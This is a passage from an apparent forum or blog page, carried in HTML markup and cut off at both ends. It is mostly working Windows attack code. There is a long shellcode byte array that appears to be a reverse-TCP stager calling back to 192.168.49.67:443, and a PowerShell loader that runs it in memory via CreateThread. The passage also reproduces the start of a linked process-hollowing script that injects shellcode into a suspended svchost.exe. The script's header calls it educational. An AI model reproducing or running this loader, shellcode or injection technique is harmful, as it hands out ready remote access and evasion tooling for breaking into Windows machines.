style="color:#333333;font-weight:400">0xd6</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xf1</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x3</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x8</span>,<span style="color:#333333;font-weight:400">0x45</span>,<span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0xd1</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xd8</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x1c</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x4</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x5e</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xec</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x12</span>,<span style="color:#333333;font-weight:400">0xe9</span>,<span style="color:#333333;font-weight:400">0x4b</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0x5d</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xbe</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x73</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe6</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x81</span>,<span style="color:#333333;font-weight:400">0xec</span>,<span style="color:#333333;font-weight:400">0xa0</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xbc</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xbb</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0xa8</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0x43</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x54</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe4</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf1</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x26</span>,<span style="color:#333333;font-weight:400">0x7</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xea</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x29</span>,<span style="color:#333333;font-weight:400">0x80</span>,<span style="color:#333333;font-weight:400">0x6b</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x5e</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc2</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0xea</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0xdf</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x99</span>,<span style="color:#333333;font-weight:400">0xa5</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xce</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0x93</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xec</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x4</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0xd9</span>,<span style="color:#333333;font-weight:400">0xc8</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xf8</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x7e</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xc4</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x5e</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf6</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf2</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0xa4</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc3</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xda</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0xd9</span>,<span style="color:#333333;font-weight:400">0xc8</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xf8</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x7d</span>,<span style="color:#333333;font-weight:400">0x28</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0xb</span>,<span style="color:#333333;font-weight:400">0x2f</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0x6e</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xce</span>,<span style="color:#333333;font-weight:400">0xe9</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc3</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x29</span>,<span style="color:#333333;font-weight:400">0xc6</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xf6</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xb4</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xe7</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0xbb</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x1d</span>,<span style="color:#333333;font-weight:400">0x2a</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xda</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span><br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$buf</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$lpMem</span>, <span style="color:#0088ff;font-weight:400">$buf</span>.length)<br /><br /><span style="color:#0088ff;font-weight:400"># Execute shellcode and wait for it to exit</span><br /><span style="color:#0088ff;font-weight:400">$hThread</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),<br />  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$lpMem</span>,[IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero,<span style="color:#333333;font-weight:400">0</span>,[IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero)<br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),<br />  (getDelegateType @([IntPtr], [<span style="color:#7f0044;font-weight:400">Int32</span>])([<span style="color:#7f0044;font-weight:400">Int</span>]))).Invoke(<span style="color:#0088ff;font-weight:400">$hThread</span>, <span style="color:#333333;font-weight:400">0xFFFFFFFF</span>)</pre></div></p><p></p><p><a href="https://gist.githubusercontent.com/qtc-de/1ecc57264c8270f869614ddd12f2f276/raw/c5810a377af12b21629f25cd60b2e9c42713b8e8/DynWin32-ShellcodeProcessHollowing.ps1">https://gist.githubusercontent.com/qtc-de/1ecc57264c8270f869614ddd12f2f276/raw/c5810a377af12b21629f25cd60b2e9c42713b8e8/DynWin32-ShellcodeProcessHollowing.ps1</a></p><p><div class="codebox"><pre>&lt;#<br /><br />DynWin32-ShellcodeProcessHollowing.ps1 performs shellcode based process hollowing using<br />dynamically looked up Win32 API calls. The script obtains the methods GetModuleHandle,<br />GetProcAddress and CreateProcess by using reflection. Afterwards it utilizes GetModuleHandle<br />and GetProcAddress to obtain the addresses of the other required Win32 API calls.<br /><br />When all required Win32 API calls are looked up, it starts svchost.exe in a suspended state<br />and overwrites the entrypoint with the specified shellcode. Afterwards, the thread is resumed<br />and the shellcode is executed enveloped within the trusted svchost.exe process.<br /><br />This script should be used for educational purposes only. It was only tested on Windows 10 (x64)<br />and is probably not stable or portable. It&#39;s only purpose is to demonstrate the usage of reflective<br />lookups of Win32 API calls. See it as just an silly experiment :)<br /><br />Author: Tobias Neitzel (@qtc_de)<br />License: GPL-3.0 License<br /><br />#&gt;<br /><br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]] <span style="color:#0088ff;font-weight:400">$SHELLCODE</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0xff</span>, ...<br /><br /><span style="color:#ff9d00;font-weight:700">filter</span> <span style="color:#00117f;font-weight:400">Get-Type</span> ([<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#0088ff;font-weight:400">$dllName</span>,[<span style="color:#7f0044;font-weight:400">string</span>]<span style="color:#0088ff;font-weight:400">$typeName</span>)<br />{<br />    <span style="color:#ff9d00;font-weight:700">if</span>( <span style="color:#0088ff;font-weight:400">$_</span>.GlobalAssemblyCache <span style="color:#ff9d00;font-weight:700">-And</span> <span style="color:#0088ff;font-weight:400">$_</span>.Location.Split(<span style="color:#333333;font-weight:400">&#39;\\&#39;</span>)[<span style="color:#ff9d00;font-weight:700">-</span><span style="color:#333333;font-weight:400">1</span>].Equals(<span style="color:#0088ff;font-weight:400">$dllName</span>) )<br />    {<br />        <span style="color:#0088ff;font-weight:400">$_</span>.GetType(<span style="color:#0088ff;font-weight:400">$typeName</span>)<br />    }<br />}<br /><br /><span style="color:#ff9d00;font-weight:700">function</span> <span style="color:#00117f;font-weight:400">Get-Function</span><br />{<br />    <span style="color:#ff9d00;font-weight:700">Param</span>(<br />        [<span style="color:#7f0044;font-weight:400">string</span>] <span style="color:#0088ff;font-weight:400">$module</span>,<br />        [<span style="color:#7f0044;font-weight:400">string</span>] <span style="color:#0088ff;font-weight:400">$function</span><br />    )<br /><br />    <span style="color:#ff9d00;font-weight:700">if</span>( (<span style="color:#0088ff;font-weight:400">$null</span> <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#0088ff;font-weight:400">$GetModuleHandle</span>) <span style="color:#ff9d00;font-weight:700">-or</span> (<span style="color:#0088ff;font-weight:400">$null</span> <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#0088ff;font-weight:400">$GetProcAddress</span>) )<br />    {<br />        <span style="color:#ff9d00;font-weight:700">throw</span> <span style="color:#3ad900;font-weight:400">&quot;Error: GetModuleHandle and GetProcAddress must be initialized first!&quot;</span><br />    }<br /><br />    <span style="color:#0088ff;font-weight:400">$moduleHandle</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$GetModuleHandle</span>.Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @(<span style="color:#0088ff;font-weight:400">$module</span>))<br />    <span style="color:#0088ff;font-weight:400">$GetProcAddress</span>.Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @(<span style="color:#0088ff;font-weight:400">$moduleHandle</span>, <span style="color:#0088ff;font-weight:400">$function</span>))<br />}<br /><br /><span style="color:#ff9d00;font-weight:700">function</span> <span style="color:#00117f;font-weight:400">Get-Delegate</span><br />{<br />    <span style="color:#ff9d00;font-weight:700">Param</span> (<br />        [<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>, <span style="color:#ff9d00;font-weight:400">Mandatory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$True</span>)] [IntPtr] <span style="color:#0088ff;font-weight:400">$funcAddr</span>,<br />        [<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">1</span>, <span style="color:#ff9d00;font-weight:400">Mandatory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$True</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>[]] <span style="color:#0088ff;font-weight:400">$argTypes</span>,<br />        [<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">2</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>] <span style="color:#0088ff;font-weight:400">$retType</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">Void</span>]<br />    )<br /><br />    <span style="color:#0088ff;font-weight:400">$type</span> <span style="color:#ff9d00;font-weight:700">=</span> [AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.DefineDynamicAssembly((<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Reflection.AssemblyName(<span style="color:#333333;font-weight:400">&#39;QD&#39;</span>)), [System.Reflection.Emit.AssemblyBuilderAccess]<span style="color:#ff9d00;font-weight:700">::</span>Run).<br />    DefineDynamicModule(<span style="color:#333333;font-weight:400">&#39;QM&#39;</span>, <span style="color:#0088ff;font-weight:400">$false</span>).<br />    DefineType(<span style="color:#333333;font-weight:400">&#39;QT&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span>, [System.MulticastDelegate])<br />    <span style="color:#0088ff;font-weight:400">$type</span>.DefineConstructor(<span style="color:#333333;font-weight:400">&#39;RTSpecialName, HideBySig, Public&#39;</span>,[System.Reflection.CallingConventions]<span style="color:#ff9d00;font-weight:700">::</span>Standard, <span style="color:#0088ff;font-weight:400">$argTypes</span>).SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br />    <span style="color:#0088ff;font-weight:400">$type</span>.DefineMethod(<span style="color:#333333;font-weight:400">&#39;Invoke&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span>, <span style="color:#0088ff;font-weight:400">$retType</span>, <span style="color:#0088ff;font-weight:400">$argTypes</span>).SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br />    <span style="color:#0088ff;font-weight:400">$delegate</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$type</span>.CreateType()<br /><br />    [System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer(<span style="color:#0088ff;font-weight:400">$funcAddr</span>, <span style="color:#0088ff;font-weight:400">$delegate</span>)<br />}<br /><br /><span style="color:#0088ff;font-weight:400"># Obtain the required types via reflection</span><br /><span style="color:#0088ff;font-weight:400">$assemblies</span> <span style="color:#ff9d00;font-weight:700">=</span> [AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.GetAssemblies()<br /><span style="color:#0088ff;font-weight:400">$unsafeMethodsType</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$assemblies</span> | <span style="color:#00117f;font-weight:400">Get-Type</span> <span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span> <span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span><br /><span style="color:#0088ff;font-weight:400">$nativeMethodsType</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$assemblies</span> | <span style="color:#00117f;font-weight:400">Get-Type</span> <span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span> <span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.NativeMethods&#39;</span><br /><span style="color:#0088ff;font-weight:400">$startupInformationType</span> <span style="color:#ff9d00;font-weight:700">=</span>  <span style="color:#0088ff;font-weight:400">$assemblies</span> | <span style="color:#00117f;font-weight:400">Get-Type</span> <span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span> <span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.NativeMethods+STARTUPINFO&#39;</span><br /><span style="color:#0088ff;font-weight:400">$processInformationType</span> <span style="color:#ff9d00;font-weight:700">=</span>  <span style="color:#0088ff;font-weight:400">$assemblies</span> | <span style="color:#00117f;font-weight:400">Get-Type</span> <span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span> <span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400"># Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess</span><br /><span style="color:#0088ff;font-weight:400">$GetModuleHandle</span> <span 